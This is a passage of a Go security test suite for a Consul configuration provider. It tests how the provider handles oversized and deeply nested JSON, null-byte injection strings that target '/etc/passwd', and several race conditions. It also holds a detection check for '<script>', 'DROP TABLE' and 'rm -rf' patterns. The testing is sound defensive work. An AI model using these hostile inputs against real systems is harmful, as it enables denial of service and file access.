				strings.Repeat(`"field": "value",`, 1000)[:len(strings.Repeat(`"field": "value",`, 1000))-1]),
			description: "Oversized configuration for DoS",
		},
		{
			name:        "DeeplyNestedConfig",
			configData:  strings.Repeat(`{"nested":`, 1000) + `"value"` + strings.Repeat(`}`, 1000),
			description: "Deeply nested JSON for parser DoS",
		},
		{
			name: "NullByteInjection",
			configData: `{
				"file": "config.json\u0000.exe",
				"path": "/etc/passwd\x00.txt"
			}`,
			description: "Null byte injection in strings",
		},
	}

	for _, attack := range maliciousConfigs {
		t.Run(attack.name, func(t *testing.T) {
			provider := &ConsulProvider{}
			provider.SetMockData(map[string]string{
				"malicious_config": attack.configData,
			})

			// SECURITY TEST: Load malicious configuration
			ctxTimeout, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			startMemory := getCurrentMemoryUsage()
			startTime := time.Now()

			config, err := provider.Load(ctxTimeout, "consul://localhost:8500/malicious_config")

			endTime := time.Now()
			endMemory := getCurrentMemoryUsage()
			duration := endTime.Sub(startTime)

			if err != nil {
				// Configuration was rejected - check error doesn't leak sensitive data
				t.Logf("Malicious config rejected (potentially good): %v", err)

				// Ensure error doesn't contain the malicious payload
				errorMsg := err.Error()
				if len(attack.configData) > 50 && strings.Contains(errorMsg, attack.configData[:50]) {
					t.Errorf("SECURITY WARNING: Error message contains malicious payload")
				}
			} else {
				// Configuration was loaded - perform security analysis
				t.Logf("Malicious config loaded - analyzing security impact")

				// Check for excessive memory usage (handle potential underflow)
				var memoryIncrease uint64
				if endMemory > startMemory {
					memoryIncrease = endMemory - startMemory
				} else {
					memoryIncrease = 0 // Memory decreased or GC ran
				}

				if memoryIncrease > 50*1024*1024 { // More than 50MB
					t.Errorf("SECURITY VULNERABILITY: Malicious config caused excessive memory usage: %d bytes",
						memoryIncrease)
				}

				// Check for excessive processing time
				if duration > 5*time.Second {
					t.Errorf("SECURITY VULNERABILITY: Malicious config caused excessive processing time: %v",
						duration)
				}

				// Verify configuration structure is reasonable
				if config != nil {
					configStr := fmt.Sprintf("%+v", config)
					if len(configStr) > 100*1024 { // More than 100KB when printed
						t.Errorf("SECURITY WARNING: Loaded configuration is excessively large")
					}

					// Check for successful injection indicators
					if strings.Contains(configStr, "<script>") ||
						strings.Contains(configStr, "DROP TABLE") ||
						strings.Contains(configStr, "rm -rf") {
						t.Logf("SECURITY NOTICE: Malicious patterns found in loaded config - ensure they are safely handled by application")
					}
				}
			}

			ctx.CheckResourceLeak(fmt.Sprintf("malicious config: %s", attack.name))
		})
	}
}

// =============================================================================
// RACE CONDITION AND CONCURRENCY ATTACKS
// =============================================================================

// TestSecurity_RaceConditionAttacks tests for race condition vulnerabilities.
//
// ATTACK VECTOR: Race conditions (CWE-362)
// DESCRIPTION: Attackers attempt to exploit race conditions in concurrent
// operations to bypass security checks or cause undefined behavior.
func TestSecurity_RaceConditionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("ConcurrentInitializationRace", func(t *testing.T) {
		// Test race condition in provider initialization
		const numGoroutines = 100
		var wg sync.WaitGroup
		var providers []*ConsulProvider
		var mu sync.Mutex

		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				provider := &ConsulProvider{}
				provider.SetMockData(map[string]string{
					"config": `{"test": "value"}`,
				})

				// Attempt concurrent initialization
				err := provider.Validate("consul://localhost:8500/config")
				if err == nil {
					mu.Lock()
					providers = append(providers, provider)
					mu.Unlock()
				}
			}()
		}

		wg.Wait()

		// All initializations should succeed without data races
		if len(providers) != numGoroutines {
			t.Logf("Some provider initializations failed: %d/%d", len(providers), numGoroutines)
		}

		// Clean up providers
		for _, provider := range providers {
			_ = provider.Close()
		}

		ctx.CheckResourceLeak("concurrent initialization race")
	})

	t.Run("ConcurrentLoadAndCloseRace", func(t *testing.T) {
		// Test race between Load operations and Close
		provider := &ConsulProvider{}
		provider.SetMockData(map[string]string{
			"config": `{"test": "value"}`,
		})

		var wg sync.WaitGroup
		var loadErrors int32
		var closeErrors int32

		// Start multiple Load operations
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
				defer cancel()

				_, err := provider.Load(ctx, "consul://localhost:8500/config")
				if err != nil {
					atomic.AddInt32(&loadErrors, 1)
				}
			}()
		}

		// Concurrently close the provider
		go func() {
			time.Sleep(100 * time.Millisecond) // Let some loads start
			if err := provider.Close(); err != nil {
				atomic.AddInt32(&closeErrors, 1)
			}
		}()

		wg.Wait()

		t.Logf("Concurrent Load/Close: Load errors: %d, Close errors: %d",
			atomic.LoadInt32(&loadErrors), atomic.LoadInt32(&closeErrors))

		// Some load errors are expected after Close() is called
		// No close errors should occur
		if atomic.LoadInt32(&closeErrors) > 0 {
			t.Errorf("SECURITY ISSUE: Close() operation had errors during concurrent access")
		}

		ctx.CheckResourceLeak("concurrent load and close race")
	})

	t.Run("ConcurrentWatchRace", func(t *testing.T) {
		// Test race conditions in Watch operations
		provider := &ConsulProvider{}
		provider.SetMockData(map[string]string{
			"config": `{"test": "value"}`,
		})

		var wg sync.WaitGroup
		var watchChannels []<-chan map[string]interface{}
		var contexts []context.Context
		var cancels []context.CancelFunc
		var mu sync.Mutex

		// Start multiple concurrent Watch operations
		for i := 0; i < 10; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)

				ch, err := provider.Watch(ctx, "consul://localhost:8500/config")
				if err == nil {
					mu.Lock()
					watchChannels = append(watchChannels, ch)
					contexts = append(contexts, ctx)
					cancels = append(cancels, cancel)
					mu.Unlock()
				} else {
					cancel()
				}
			}(i)
		}

		wg.Wait()

		// Trigger configuration update to test race in watch notifications
		time.Sleep(100 * time.Millisecond)
		provider.UpdateMockData("config", `{"test": "updated_value"}`)

		// Wait for notifications
		time.Sleep(500 * time.Millisecond)

		// Cancel all watches
		for _, cancel := range cancels {
			cancel()
		}

		// Consume any pending notifications to prevent goroutine leaks
		time.Sleep(200 * time.Millisecond)
		for _, ch := range watchChannels {
			select {
			case <-ch:
				// Consume notification
			default:
				// No notification available
			}
		}

		_ = provider.Close()
		ctx.CheckResourceLeak("concurrent watch race")
	})

	t.Run("MockDataUpdateRace", func(t *testing.T) {
		// Test race conditions in mock data updates
		provider := &ConsulProvider{}
		provider.SetMockData(map[string]string{
			"config": `{"test": "initial"}`,
		})

		var wg sync.WaitGroup
		var updates int32
		var reads int32

		// Concurrent readers
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()

				for j := 0; j < 10; j++ {
					ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
					_, err := provider.Load(ctx, "consul://localhost:8500/config")
					cancel()

					if err == nil {
						atomic.AddInt32(&reads, 1)
					}

					time.Sleep(time.Millisecond)
				}
			}()
		}

		// Concurrent writers
		for i := 0; i < 5; i++ {
			wg.Add(1)
			go func(writerID int) {
				defer wg.Done()

				for j := 0; j < 5; j++ {
					newConfig := fmt.Sprintf(`{"test": "writer_%d_update_%d"}`, writerID, j)
					provider.UpdateMockData("config", newConfig)
					atomic.AddInt32(&updates, 1)

					time.Sleep(10 * time.Millisecond)
				}
			}(i)
		}

		wg.Wait()

		t.Logf("Mock data race test: %d updates, %d reads completed",
			atomic.LoadInt32(&updates), atomic.LoadInt32(&reads))

		_ = provider.Close()
		ctx.CheckResourceLeak("mock data update race")
	})
}

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

// getCurrentMemoryUsage returns current memory allocation for testing.
func getCurrentMemoryUsage() uint64 {
	var memStats runtime.MemStats
	runtime.GC()
	time.Sleep(10 * time.Millisecond) // Allow GC to complete
	runtime.ReadMemStats(&memStats)
	return memStats.Alloc
}
